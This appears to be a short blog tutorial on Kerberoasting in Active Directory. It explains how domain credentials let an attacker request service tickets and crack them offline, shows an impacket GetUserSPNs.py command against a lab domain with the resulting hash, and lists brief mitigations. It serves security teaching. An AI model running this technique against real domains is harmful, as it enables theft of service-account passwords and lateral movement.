---
title: "Kerberoast"
tags:
    - active directory
date: "2024-06-21"
thumbnail: "/assets/img/thumbnail/kerberos.png"
bookmark: true
---

# Kerberoast

This attack is a form of Lateral Movement in Active Directory
Once You get any credentials in the domain, Do Kerberoasting !!

but who is the target now ?

It's done againest any service account exploiting TGS creation mechanism,

TGS : Ticket Granting Service
This ticket is sent to the user who wants to access a specific service when this user provide the TGT

The TGS is encrypted using the hash of the service, so you can try cracking it offline to get the password of the service

> Note : If there's a port number in the SPN make sure that u remove it from the hash you get

We use `GetUserSPNs.py` from impacket

### example usage

```bash
┌──(youssif㉿youssif)-[/usr/share/doc/python3-impacket/examples]
└─$ python ./GetUserSPNs.py -dc-ip 192.168.2.129 rift.local/abdo:abdo123 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName                  Name        MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  --------  --------------------------  ---------  ----------
NINJA-DC/SQLService.rift.local:60001  SQLService            2024-02-16 10:27:07.970505  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$RIFT.LOCAL$rift.local/SQLService*$8953860704b1ee9e903ebfd13994127a$cb4559b82bac5bbb6fbdb6cbb0a59e7f0b63c4876b57b6bff24e39437b117aa8c5e1068b20fa2e98db8985d2bdf03ac4c47c53ca5abe4f620f10dd7def738f1b86c9af44fd28e5a23ca9104c7e1fa8dd79c06a626a7bba50ec14e68e553193be29b9e2059823f978cff43a029855c49885e101afdb5f006f987f9af300579f53b900acf1b2306e43ee8b726f463927c5863f39d3d58151d4d07ed745b43ba1106033eedef86a4eb2a0b228592a5038f3c523c608e95cebfed3f5eaa53411abe772c7fba6cae95e3e79a0d4250dc423aad2b6e2f45f2cf28733940b5d890e218ebee0c5d85ededa76e2a847bf101859a7c88e48721535fcb2f70e90c8810b433ebf8122d68b6794bf61a2a9346d96a0eaed7c82ea7ec8f8b488b9e9d5abc4b65d448de3e6791b53ec3d334ca005c640831b3e0aa6763e8cb96c206297f456c32ba51eaacc965a24e5ca4bddb92ea8d899470ea6b610f731bcc69b6df783a508b7396c3332ac085ec3cadbd8b34120fd2b81a192b0038f0d4d1356084b2a5976637fc6044a32e4b44f3278f1d006e47bde087aff1d52fc2cd5d9821a5849399130820860715dd7679d3d3575c015e127e93bed00012f92d041dca62abc18e56ecec99c1cfb01a08c6771bad888482089cf36333dd5b0b690a00fd248f131736e2eca4aa5f214e42fc540e43d55d3fd0350a39b03ee3606a4ab8a6985c00c2e43abe7e72250a9ddb21cd91861bc9b6ded2fe1410db0a744d89a61bdf3b19b1ce82e711696db3dcd0e7fe7fc8ef82d5b272152b6f8cbf06bb277e563cacbda406c8913f2848701cb7f5ef1999b358e31342fab00d71b4cf2c5828f50970390e041f7f74296bcf032ba7421f6a024b046f9fe44d7defd7f626eb4209ae05a62aaed3818f4dc17fc28136c3808c501361ed0f1ac7c4e677301d2c41639b26618ec9c8f07d3f88ed66eeaac94d53429232447ffbe33a8325649c07f7c44dffd8031c7bf4acb484915b5697c3fea356010e1f23555224e63ff1b315d8d11db5bd9f4be99da17b373bbaf6ab98945f0935e5d6f50feefbcc25227c43484cdb72c81e307cbece137307b8b0c51e3acdaec3c3f941de4cbebad5fd7aab2a139d0e43692b0cffafba2e7841d48ad0147014952f7df92f3003b2475f5bd08e52b1bbdea8545ed096dcb3369ca92777bd515283e7d2aaccc9d83aae1c9fd44f6608d381c7613052bdc8110bed85c97ba79bf9fb8ffe7f8525949a28299b78eb85eb0f2681ec9
```

### Mitigation

Mitigation is simple
- Use Strong Passwords (Hard to be cracked)
- Make sure the service accounts has the least privilages (Not an Admin as example)